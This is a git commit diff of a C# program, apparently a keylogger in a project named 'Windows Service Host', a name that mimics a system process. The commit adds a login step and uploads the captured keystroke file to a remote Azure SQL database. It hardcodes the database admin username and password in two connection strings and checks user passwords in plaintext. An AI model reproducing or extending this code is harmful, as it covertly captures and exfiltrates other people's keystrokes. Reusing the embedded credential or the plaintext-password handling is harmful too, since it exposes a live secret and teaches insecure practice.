c869b89fa9e0daa1e093d50720e666b3a3b0e232
Nayil <n.arana1@outlook.com>
2019-01-16 18:15:28 -0500

    Added login feature + writing report to database

--- Windows Service Host/Program.cs
+++ Windows Service Host/Program.cs
@@ -1,18 +1,9 @@
 ﻿using System;
-using System.Drawing;
-using System.Collections;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 using Keystroke.API;
-using System.ComponentModel;
 using System.IO;
-using System.Windows.Markup;
-using System.Runtime.InteropServices;
-using System.Threading;
-using System.Diagnostics;
+using System.Data.SqlClient;
+using System.Data;
 
 namespace Windows_Service_Host
 {
@@ -27,11 +18,69 @@ namespace Windows_Service_Host
             {
             }
         }
-        
-        // The main method displays the date and outputs any keystrokes typed while the program is opened.
-        // side effects: console output, writing to file
+
+        // addFileToDatabase(email) uploads the context of the textfile to the database row corresponding to the logged-in user.
+        // side effects: reads from a file, writes to a database
+        public static void addFileToDatabase(string email)
+        {
+            using (SqlConnection con = new SqlConnection(@"Server=tcp:familylogger.database.windows.net,1433;Initial Catalog=FamilyLogger;Persist Security Info=False;User ID=floggeradmin;Password=Ambergris9;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"))
+            {
+                con.Open();
+                byte[] report = File.ReadAllBytes("Report.txt");
+                SqlCommand sendReport = new SqlCommand("UPDATE users SET report = @report WHERE email = @email", con);
+                SqlParameter reportParam = sendReport.Parameters.AddWithValue("report", report);
+                SqlParameter emailParam = sendReport.Parameters.AddWithValue("email", email);
+                reportParam.DbType = DbType.Binary;
+                sendReport.ExecuteNonQuery();
+            }
+        }
+
+        // Login() logs the user in and returns the user's email address if they can be found. If not, it returns null.
+        // side effects: queries database, mutates variables
+        public static string Login()
+        {
+            using (SqlConnection con = new SqlConnection(@"Server=tcp:familylogger.database.windows.net,1433;Initial Catalog=FamilyLogger;Persist Security Info=False;User ID=floggeradmin;Password=Ambergris9;MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"))
+            {
+                con.Open();
+                SqlCommand getUserData = new SqlCommand("SELECT * FROM users WHERE email = @email AND password = @password", con);
+                Console.Write("Email Address: ");
+                string emailInput = Console.ReadLine();
+                string email = null;
+                Console.WriteLine();
+                Console.Write("Password: ");
+                string passwordInput = Console.ReadLine();
+                getUserData.Parameters.AddWithValue("email", emailInput);
+                getUserData.Parameters.AddWithValue("password", passwordInput);
+                SqlDataReader reader = getUserData.ExecuteReader();
+                while (reader.Read())
+                {
+                    email = reader["email"].ToString();
+                }
+                return email;
+            }
+        }
+
+        // The main method outputs any keystrokes typed to both the console and a text file while the program is opened. It also syncs the text file to an Azure
+        //     database.
+        // side effects: console output, writing to file, reading from and writing to a database, variable mutation
         static void Main(string[] args)
         {
+            string userEmail = null;
+            do
+            {
+                userEmail = Login();
+                if (String.IsNullOrEmpty(userEmail))
+                {
+                    Console.WriteLine("Email or password is incorrect. Please try again.");
+                }
+                else
+                {
+                    Console.WriteLine("Login successful!");
+                }
+            }
+            while (String.IsNullOrEmpty(userEmail));
+            addFileToDatabase(userEmail);
+
             using (var api = new KeystrokeAPI())
             {
                 if (!File.Exists("Report.txt"))
